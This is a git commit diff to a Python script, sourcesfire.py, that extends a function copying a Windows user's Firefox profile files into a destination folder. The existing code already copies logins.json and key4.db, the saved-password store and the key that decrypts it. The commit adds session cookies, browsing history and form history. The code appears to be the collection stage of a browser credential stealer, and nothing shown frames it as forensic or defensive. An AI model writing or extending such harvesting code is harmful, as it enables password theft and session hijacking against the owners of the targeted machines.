81b7bb84a098a0bd3bfdf3f1bbe5d0844dbbbf14
matiasb186 <86837307+matiasb186@users.noreply.github.com>
2023-10-20 12:36:48 -0500

    Update sourcesfire.py

--- sourcesfire.py
+++ sourcesfire.py
@@ -30,9 +30,15 @@ def copy(user, profile, destination):
     source = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", profile)
     logins = os.path.join(source, "logins.json")
     key = os.path.join(source, "key4.db")
+    cookies = os.path.join(source, "cookies.sqlite")
+    places = os.path.join(source, "places.sqlite")
+    formh = os.path.join(source, "formhistory.sqlite")
     
     shutil.copy(logins, os.path.join(destination, "logins.json"))
     shutil.copy(key, os.path.join(destination, "key4.db"))
+    shutil.copy(cookies, os.path.join(destination, "cookies.sqlite"))
+    shutil.copy(places, os.path.join(destination, "places.sqlite"))
+    shutil.copy(formh, os.path.join(destination, "formhistory.sqlite"))
 
 firefox_profile = fire_profile(user)
 
